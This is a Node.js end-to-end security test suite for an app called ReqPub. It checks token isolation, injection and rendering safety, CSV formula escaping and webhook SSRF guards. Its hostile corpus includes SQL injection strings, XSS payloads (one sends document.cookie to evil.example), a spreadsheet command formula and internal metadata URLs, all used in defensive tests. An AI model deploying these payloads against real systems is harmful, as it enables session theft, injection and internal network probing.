/* ReqPub C1.2 and C1.8 - the token boundary and the injection sweep
   (node tests/backend-e2e/token-injection.test.mjs)

   C1.2, the token boundary. Every link token in the product grants exactly
   one surface. This suite enumerates the token types that exist, and for each
   one asserts three things: it opens its own surface, it does not open any
   other token's surface, and once revoked it fails closed without disclosing
   whether it ever existed. The v2.34.2 incident, where an update link
   disclosed a sign token, is the reason this matrix is permanent rather than
   a one-time check.

   C1.8, injection and rendering. Hostile strings are written through the real
   RPCs into every authored field the product exposes, then read back through
   the paths a reader actually uses. SQL injection must be inert because every
   value crosses a parameter boundary; script payloads must survive as data
   and never as markup; and any value a spreadsheet would execute must arrive
   with the formula prefix in every CSV the product writes. */
import EmbeddedPostgres from 'embedded-postgres';
import pg from 'pg';
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

const rel = (p) => fileURLToPath(new URL(p, import.meta.url));
const epg = new EmbeddedPostgres({ databaseDir: join(tmpdir(), 'reqpub-tokinj-' + process.pid), user: 'postgres', password: 'pw', port: 55507, persistent: false, createPostgresUser: !!(process.getuid && process.getuid() === 0) });
await epg.initialise(); await epg.start(); await epg.createDatabase('reqpub');
const db = new pg.Client({ host: 'localhost', port: 55507, user: 'postgres', password: 'pw', database: 'reqpub' });
await db.connect();
const sql = (f) => readFileSync(f, 'utf8');
const one = async (q, a) => (await db.query(q, a)).rows[0];
const run = (q, a) => db.query(q, a);
const asUser = (uid) => db.query(`select set_config('test.uid', '${uid || ''}', false)`);
let pass = 0, fail = 0;
const check = (n, c, x) => { if (c) { pass++; console.log('  \u2713 ' + n); } else { fail++; console.log('  \u2717 ' + n + (x !== undefined ? ' \u2192 ' + JSON.stringify(x) : '')); } };

const MGR = '55555555-0000-0000-0000-0000000000c1';
const ORG = '66666666-0000-0000-0000-0000000000c1';
const VID = '77777777-0000-0000-0000-0000000000c1';
const SREQ = '88888888-0000-0000-0000-0000000000c1';

/* The hostile corpus. Each string is chosen to break a different layer. */
const HOSTILE = {
  sqlQuote: "Robert'); drop table projects; --",
  sqlUnion: "' union select token from sign_requests --",
  sqlComment: "admin'--",
  script: '<script>fetch("https://evil.example/"+document.cookie)</script>',
  imgOnerror: '<img src=x onerror=alert(document.domain)>',
  svgOnload: '<svg/onload=alert(1)>',
  jsUrl: 'javascript:alert(1)',
  attrBreak: '" onmouseover="alert(1)" data-x="',
  templateEsc: '${constructor.constructor("return 1")()}',
  formulaEq: '=cmd|\' /c calc\'!A1',
  formulaPlus: '+1+1',
  formulaMinus: '-1+1',
  formulaAt: '@SUM(1+1)',
  formulaTab: '\tSUM(A1)',
  nullByte: 'before\u0000after',
  rtl: 'invoice\u202egnp.exe',
  longUnicode: '\u0041\u0301'.repeat(200),
};

try {
  await run(sql(rel('shim.sql')));
  await run(`create extension if not exists pgcrypto`);
  await run(`set search_path = public, extensions`);
  await run(sql(rel('v1-backend.sql')));
  for (const f of ['schema.sql', 'migrations/0021_sealing.sql', 'migrations/0022_attachment_hash.sql', 'migrations/0023_webhooks.sql',
                   'migrations/0024_mcp.sql', 'migrations/0025_evidence.sql', 'migrations/0026_book_practice.sql', 'migrations/0027_pursuit_lineage.sql', 'migrations/0028_authz_lockdown.sql', 'migrations/0029_ssrf_guard.sql'])
    await run(sql(rel('../../supabase/' + f)));

  await run(`insert into auth.users(id,email) values ('${MGR}','mgr@cv.co')`);
  await run(`insert into orgs(id,name,created_by) values ('${ORG}','CV','${MGR}')`);
  await run(`insert into org_members(org_id,user_id,email,role) values ('${ORG}','${MGR}','mgr@cv.co','manager')`);
  await run(`insert into projects(id,org_id,name,created_by) values ('tp1','${ORG}','Token proof','${MGR}')`);
  await run(`insert into versions(id,project_id,seq,label,status,author_name,snapshot) values
    ('${VID}','tp1',1,'1.0','approved','Micah','{"answers":{},"sections":{}}'::jsonb)`);

  /* ================= C1.2 THE TOKEN BOUNDARY ================= */

  /* Each token type, minted the way production mints it. */
  await run(`insert into sign_requests(id,org_id,project_id,version_id,token,signer_email,signer_name,signer_role,status,doc_fingerprint,sent_at)
    values ('${SREQ}','${ORG}','tp1','${VID}','TOK_sign_c1_0123456789ab','kate@clientco.example','Kate','Sponsor','pending',repeat('ab',32),now())`);
  await run(`insert into shares(token,org_id,project_id,kind,version_seq,payload)
    values ('TOK_share_c1_0123456789','${ORG}','tp1','brief',1,'{"answers":{},"sections":{}}'::jsonb)`);
  await run(`insert into updates(id,org_id,project_id,seq,token,payload,published_at)
    values (gen_random_uuid(),'${ORG}','tp1',1,'TOK_update_c1_012345678','{"items":[]}'::jsonb,now())`);
  await run(`insert into comms(id,org_id,project_id,origin,body,reply_token,author_name)
    values (gen_random_uuid(),'${ORG}','tp1','sme','Question for the expert','TOK_sme_c1_01234567890','SME')`);
  await run(`insert into input_requests(id,org_id,project_id,token,title)
    values (gen_random_uuid(),'${ORG}','tp1','TOK_request_c1_0123456','Need input')`);

  const TOKENS = {
    sign: 'TOK_sign_c1_0123456789ab',
    share: 'TOK_share_c1_0123456789',
    update: 'TOK_update_c1_012345678',
    sme: 'TOK_sme_c1_01234567890',
    request: 'TOK_request_c1_0123456',
  };
  /* The surface each token is supposed to open, and nothing else. */
  const SURFACES = [
    ['sign', `select sign_request_context($1) j`],
    ['share', `select get_share($1) j`],
    ['update', `select update_context($1) j`],
    ['sme', `select sme_thread($1) j`],
    ['request', `select request_view($1) j`],
  ];

  await run(`set role anon`);
  const grid = {};
  for (const [surface, q] of SURFACES) {
    for (const [kind, tok] of Object.entries(TOKENS)) {
      let opened = false;
      try {
        const r = await one(q, [tok]);
        const v = r && r.j;
        opened = !!v && !(v.ok === false) && Object.keys(v).length > 0;
      } catch { opened = false; }
      grid[surface + '<-' + kind] = opened;
    }
  }
  await run(`reset role`);
  const diagonal = SURFACES.map(([s]) => grid[s + '<-' + s]);
  const offDiagonal = Object.entries(grid).filter(([k]) => k.split('<-')[0] !== k.split('<-')[1]);
  check('every token opens its own surface', diagonal.every(Boolean),
    SURFACES.map(([s], i) => s + '=' + diagonal[i]));
  check('no token opens any other token\u2019s surface, all twenty cross pairs',
    offDiagonal.every(([, v]) => v === false), offDiagonal.filter(([, v]) => v).map(([k]) => k));

  /* Revocation fails closed, and says nothing about existence. */
  await run(`update sign_requests set revoked = true where id = '${SREQ}'`);
  await run(`set role anon`);
  const revoked = await one(`select sign_request_context($1) j`, [TOKENS.sign]);
  const neverExisted = await one(`select sign_request_context($1) j`, ['TOK_sign_never_existed_00']);
  await run(`reset role`);
  check('a revoked token fails closed', !revoked.j || revoked.j.ok === false || Object.keys(revoked.j || {}).length === 0);
  check('a revoked token is indistinguishable from one that never existed',
    JSON.stringify(revoked.j) === JSON.stringify(neverExisted.j), [revoked.j, neverExisted.j]);

  /* No token value is ever readable through another token's surface. */
  await run(`set role anon`);
  const shareOut = await one(`select get_share($1) j`, [TOKENS.share]);
  const updateOut = await one(`select update_context($1) j`, [TOKENS.update]);
  await run(`reset role`);
  const blob = JSON.stringify([shareOut.j, updateOut.j]);
  check('no token value appears inside any token-scoped response',
    !Object.values(TOKENS).some((t) => blob.includes(t)) && !/TOK_/.test(blob), blob.slice(0, 120));
  check('no signer address appears inside any token-scoped response',
    !/[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}/.test(blob));

  /* ================= C1.8 INJECTION AND RENDERING ================= */

  await run(`set role authenticated`); await asUser(MGR);
  const wrote = [];
  for (const [name, payload] of Object.entries(HOSTILE)) {
    try {
      const r = await one(`select save_field('tp1', $1, to_jsonb($2::text), 0) j`, ['ctrl_' + name, payload]);
      if (r && r.j && r.j.ok) wrote.push(name);
    } catch { /* recorded by absence below */ }
  }
  await run(`reset role`);
  // PostgreSQL refuses a NUL byte in a text value outright, which is the
  // correct behaviour: it cannot be stored, so it cannot later truncate
  // anything downstream. Every other hostile string is accepted as data.
  const expectAccepted = Object.keys(HOSTILE).filter((k) => k !== 'nullByte');
  check('every storable hostile string is accepted as data through the real write path',
    expectAccepted.every((k) => wrote.includes(k)), expectAccepted.filter((k) => !wrote.includes(k)));
  check('a NUL byte is refused at the database boundary rather than silently truncated',
    !wrote.includes('nullByte'));

  const stillThere = await one(`select count(*)::int n from pg_tables where tablename = 'projects'`);
  check('the SQL injection corpus did not drop, alter, or reach any table', stillThere.n === 1);

  const back = await one(`select value #>> '{}' v from project_fields where project_id='tp1' and field_id='ctrl_sqlQuote'`);
  check('a quote-bearing value round-trips byte for byte: it crossed a parameter boundary',
    back.v === HOSTILE.sqlQuote, back.v);
  const unionBack = await one(`select value #>> '{}' v from project_fields where project_id='tp1' and field_id='ctrl_sqlUnion'`);
  check('a union payload is stored as text, not executed', unionBack.v === HOSTILE.sqlUnion);
  const nul = await one(`select count(*)::int n from project_fields where project_id='tp1' and field_id='ctrl_nullByte'`);
  check('the refused NUL write left no partial row behind', nul.n === 0, nul.n);
  const rtl = await one(`select value #>> '{}' v from project_fields where project_id='tp1' and field_id='ctrl_rtl'`);
  check('a right-to-left override is stored verbatim, to be neutralised at render, not at rest',
    rtl.v === HOSTILE.rtl, rtl && rtl.v);

  /* The rendering path: the same values through the client's escaper. */
  globalThis.location = { origin: 'https://reqpub.com', pathname: '/' };
  const { esc, escA } = await import('../../app/js/core.js');
  const dangerous = [HOSTILE.script, HOSTILE.imgOnerror, HOSTILE.svgOnload, HOSTILE.attrBreak, HOSTILE.jsUrl];
  // The property is that no tag can form, not that the words disappear:
  // "onerror=" as literal text inside an escaped string is inert, and
  // stripping it would be lying to the reader about what was authored.
  check('no payload can form a tag after escaping: no raw angle bracket survives',
    dangerous.every((d) => !/[<>]/.test(esc(d))), dangerous.map(esc).find((x) => /[<>]/.test(x)));
  check('a javascript: URL is escaped as text and is never emitted as an href',
    esc(HOSTILE.jsUrl) === 'javascript:alert(1)' && !/[<>"]/.test(esc(HOSTILE.jsUrl)));
  check('no payload can break out of an attribute through the attribute escaper',
    dangerous.every((d) => !escA(d).includes('"')), dangerous.map(escA).find((x) => x.includes('"')));

  /* The CSV path: every export the product writes. */
  const { csvCell } = await import('../../app/js/evidencepack.js');
  const formulas = [HOSTILE.formulaEq, HOSTILE.formulaPlus, HOSTILE.formulaMinus, HOSTILE.formulaAt, HOSTILE.formulaTab];
  check('every formula-leading value is prefixed so a spreadsheet treats it as text',
    formulas.every((f) => { const c = csvCell(f); return c.startsWith("'") || c.startsWith('"\'') || c.startsWith('="'); }),
    formulas.map((f) => csvCell(f).slice(0, 12)));
  check('a benign value is not mangled by the formula guard',
    csvCell('Riverbend rollout') === 'Riverbend rollout' || csvCell('Riverbend rollout') === '"Riverbend rollout"',
    csvCell('Riverbend rollout'));
  check('a value containing a quote and a comma is quoted and doubled, not truncated',
    (() => { const c = csvCell('a,"b"'); return c.includes('""') && c.startsWith('"') && c.endsWith('"'); })(), csvCell('a,"b"'));

  /* The record of delivery renders the same hostile values. */
  const { buildRecordOfDelivery } = await import('../../app/js/recordofdelivery.js');
  const rod = buildRecordOfDelivery({
    project: { id: 'tp1', name: HOSTILE.script },
    answers: { ctrl_objective: HOSTILE.imgOnerror, metrics: [{ metric: HOSTILE.svgOnload, target: HOSTILE.attrBreak }] },
    versions: [], signatures: [], receipts: [],
  });
  check('the close document escapes hostile authored values on every surface it renders',
    !/<script|<img src=x|<svg\/onload/i.test(rod), (rod.match(/<(script|img|svg)[^>]*>/i) || [])[0]);
  check('and the escaped payload is still present as readable text, not silently dropped',
    rod.includes('&lt;script&gt;') || rod.includes('&lt;img'));

  /* ================= C1.3 EGRESS: THE EAST-WEST TEST ================= */
  await run(`set role authenticated`); await asUser(MGR);
  const HOSTILE_URLS = [
    ['https://169.254.169.254/latest/meta-data/', 'cloud metadata'],
    ['https://127.0.0.1/hook', 'loopback'],
    ['https://127.1/hook', 'short loopback'],
    ['https://2130706433/hook', 'decimal loopback'],
    ['https://0x7f000001/hook', 'hex loopback'],
    ['https://0177.0.0.1/hook', 'octal loopback'],
    ['https://10.0.0.5/hook', 'RFC 1918'],
    ['https://172.16.4.4/hook', 'RFC 1918 middle'],
    ['https://192.168.1.1/hook', 'RFC 1918 home'],
    ['https://100.64.0.1/hook', 'carrier-grade NAT'],
    ['https://[::1]/hook', 'IPv6 loopback'],
    ['https://[::ffff:127.0.0.1]/hook', 'IPv4-mapped IPv6'],
    ['https://localhost/hook', 'localhost'],
    ['https://api.localhost/hook', 'localhost suffix'],
    ['https://db.internal/hook', 'internal suffix'],
    ['https://printer.local/hook', 'mDNS suffix'],
    ['https://vault/hook', 'single label'],
    ['https://good.example@169.254.169.254/hook', 'userinfo disguise'],
    ['https://evil.example./hook', 'trailing dot'],
    ['http://good.example/hook', 'plain http'],
  ];
  const admitted = [];
  for (const [url, label] of HOSTILE_URLS) {
    const r = await one(`select endpoint_create('tp1', $1, 'probe') j`, [url]);
    if (r.j && r.j.ok) admitted.push(label);
  }
  check('every internal, IP-literal, and disguised destination is refused at creation',
    admitted.length === 0, admitted);
  const good = await one(`select endpoint_create('tp1', 'https://hooks.clientco.example/reqpub', 'real') j`);
  check('a genuine public destination is still accepted', good.j && good.j.ok === true, good.j);
  const reason = await one(`select endpoint_create('tp1', 'https://10.0.0.5/hook', 'x') j`);
  check('the refusal states a reason a human can act on',
    reason.j.error === 'ip_literal_not_allowed' && String(reason.j.message).length > 20, reason.j);
  await run(`reset role`);

  // A row stored before the guard existed must still never receive bytes.
  await run(`insert into webhook_endpoints(org_id, project_id, url, active)
    values ('${ORG}', 'tp1', 'https://169.254.169.254/legacy', true)`);
  const legacyEp = await one(`select id from webhook_endpoints where url like '%169.254%' limit 1`);
  await run(`insert into webhook_deliveries(id, endpoint_id, event_type, payload)
    values (gen_random_uuid(), $1, 'acceptance.sealed', '{}'::jsonb)`, [legacyEp.id]);
  await run(`set role authenticated`); await asUser(MGR);
  const due = await one(`select deliveries_due('tp1', 50) j`);
  await run(`reset role`);
  check('a destination stored before the guard is never dispatched to',
    due.j.ok === true && (due.j.ids || []).length === 0, due.j);
} catch (e) {
  fail++; console.log('  \u2717 suite error \u2192 ' + String((e && e.message) || e));
} finally {
  try { await db.end(); } catch {}
  try { await epg.stop(); } catch {}
}
console.log(`token boundary + injection: ${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
